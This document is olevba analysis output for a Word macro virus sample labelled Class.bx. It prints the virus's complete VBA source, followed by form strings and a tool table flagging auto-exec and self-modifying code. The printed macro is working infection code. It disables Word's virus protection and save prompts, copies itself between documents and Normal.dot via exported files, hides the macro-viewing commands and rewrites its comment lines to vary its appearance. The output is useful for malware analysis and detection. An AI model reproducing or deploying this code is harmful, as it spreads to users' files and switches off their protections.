olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
ll.UserForm_Click
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Select Case Day(Now)
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Case 25 To 31
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
ll.Show
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Select
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Sub
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Sub ViewVBCode()
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Sub
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Sub ToolsMacro()
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Sub
-------------------------------------------------------------------------------
VBA MACRO ll.frm 
in file: Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00 - OLE stream: 'Macros/VBA/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Sub UserForm_Click()
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
On Error GoTo out
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Options.VirusProtection = False
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Options.SaveNormalPrompt = False
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Options.ConfirmConversions = False
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt > 0 And ad > 0 Then GoTo out
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt = 0 Then
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Set infect = NormalTemplate.VBProject.VBComponents
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Set host = ActiveDocument.VBProject.VBComponents
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 5, "select case day(now)"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 7, "case 25 to 31"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 9, Application.UserInitials & ".show"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 11, "end select"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).Name = infect.Item(1).Name
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(2).Name = Application.UserInitials
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).Export "c:\kernel.sys"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(2).Export "c:\kernel2.sys"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End If
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
infect.Import ("c:\kernel2.sys")
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
infect.Item(1).codemodule.AddFromFile ("c:\kernel.sys")
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
With infect.Item(1).codemodule
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    For x = 1 To 4
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .deletelines 1
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Next x
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    If nt = 0 Then
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .insertlines 14, vbCr & "Sub ViewVBCode()"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .insertlines 16, vbCr & "End Sub"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .insertlines 18, vbCr & "Sub ToolsMacro()"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .insertlines 20, vbCr & "End Sub"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    CommandBars("tools").Controls("Templates and add-ins...").Delete
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    End If
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End With
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
With infect.Item(2).codemodule
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .deletelines 1
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Next x
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End With
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
With infect.Item(1).codemodule
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Next x
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End With
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
out:
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Sub
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DiWa�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-eH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This message was dedicated 2 all my friends, who have good skill but terminated from their company, and become joblessomI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be Missede
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Keep your good working guys, We appreciated with all you have done, good luck and success 4 Uds,I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Class.bx-662a3b3e564424ecfe6bd9d5ea63fee43a3cdd00' - OLE stream: 'Macros/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
